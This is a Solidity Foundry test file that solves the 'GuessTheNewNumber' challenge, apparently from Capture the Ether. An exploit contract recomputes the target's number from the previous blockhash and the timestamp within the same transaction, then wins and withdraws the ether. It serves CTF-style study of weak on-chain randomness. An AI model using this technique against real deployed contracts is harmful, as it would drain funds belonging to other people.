// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/4.GuessTheNewNumber.sol";

/*
 * @dev Contract for exploting the GuessTheNewNumber contract
 * @dev This exploit happens due to deterministic nature of the blockhash function
 */
contract Exploit {
    function getAnswer() public view returns (uint8) {
        return
            uint8(
                uint256(
                    keccak256(
                        abi.encodePacked(
                            blockhash(block.number - 1),
                            block.timestamp
                        )
                    )
                )
            );
    }

    /*
    @params t - the target contract
    @dev This function will call the guess function of the target contract
    */
    function attack(GuessTheNewNumber t) external payable {
        t.guess{value: 1 ether}(getAnswer());
        payable(msg.sender).transfer(address(this).balance);
    }

    /*
    @notice This function is needed to receive the ether sent by the target contract
    */
    receive() external payable {}
}

contract CounterTest is Test {
    // @notice The target contract
    GuessTheNewNumber public target;

    address player = vm.addr(1);

    function setUp() public {
        target = new GuessTheNewNumber{value: 1 ether}();
        vm.label(address(target), "Target");
        vm.label(player, "Player");
        vm.deal(player, 1 ether);
    }

    function testGuess() public {
        vm.startPrank(address(player));

        // Initialize the oracle contract
        Exploit exploit = new Exploit();

        // Call oracle contrac to explit the target contract
        // @notice you can pass the answer as a parameter but the blockhash can be changed
        exploit.attack{value: 1 ether}(target);

        assertTrue(target.isComplete());
    }
}
